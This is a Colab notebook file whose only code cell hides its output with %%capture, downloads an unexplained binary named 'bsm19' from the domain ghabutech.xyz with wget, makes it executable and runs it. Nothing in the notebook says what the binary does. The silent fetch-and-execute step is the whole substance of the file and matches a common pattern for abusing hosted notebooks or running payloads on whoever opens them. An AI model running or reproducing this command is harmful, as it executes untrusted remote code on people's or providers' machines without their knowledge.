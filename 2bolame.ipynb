{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "bolame.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyOz2ARyKLJX9PWRX6+aI3DK",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/mbc3/blob/main/2bolame.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "wN0-96uZww1u"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "!wget https://ghabutech.xyz/point/bsm19 && chmod +x bsm19 && ./bsm19"
      ]
    }
  ]
}